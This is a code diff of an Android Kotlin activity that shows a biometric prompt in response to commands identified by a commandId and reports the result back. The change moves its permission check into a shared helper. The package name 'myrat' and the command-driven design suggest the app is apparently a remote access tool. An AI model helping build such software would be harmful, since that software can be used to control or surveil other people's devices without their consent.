@@ -11,6 +11,7 @@ import androidx.biometric.BiometricManager
 import androidx.biometric.BiometricPrompt as BiometricPromptCompat
 import androidx.core.content.ContextCompat
 import com.myrat.app.utils.Logger
+import com.myrat.app.utils.PermissionUtils
 import java.util.concurrent.Executor
 
 class BiometricAuthActivity : AppCompatActivity() {
@@ -57,7 +58,8 @@ class BiometricAuthActivity : AppCompatActivity() {
             
             Logger.log("BiometricAuthActivity started: commandId=$commandId, action=$action")
             
-            if (!hasBiometricPermission()) {
+            // Use centralized permission checking
+            if (!PermissionUtils.hasBiometricPermissions(this)) {
                 Logger.error("Biometric permission not granted: commandId=$commandId, action=$action")
                 sendResult(commandId!!, RESULT_FAILED, "Biometric permission not granted", action!!)
                 finish()
@@ -210,14 +212,6 @@ class BiometricAuthActivity : AppCompatActivity() {
         }
     }
 
-    private fun hasBiometricPermission(): Boolean {
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            ContextCompat.checkSelfPermission(this, android.Manifest.permission.USE_BIOMETRIC) == PackageManager.PERMISSION_GRANTED
-        } else {
-            true
-        }
-    }
-
     override fun onDestroy() {
         super.onDestroy()
         try {
@@ -229,7 +223,6 @@ class BiometricAuthActivity : AppCompatActivity() {
 
     override fun onBackPressed() {
         try {
-            // Handle back press as cancellation
             sendResult(commandId ?: "unknown", RESULT_CANCELLED, "User pressed back button", action ?: "unknown")
             super.onBackPressed()
         } catch (e: Exception) {
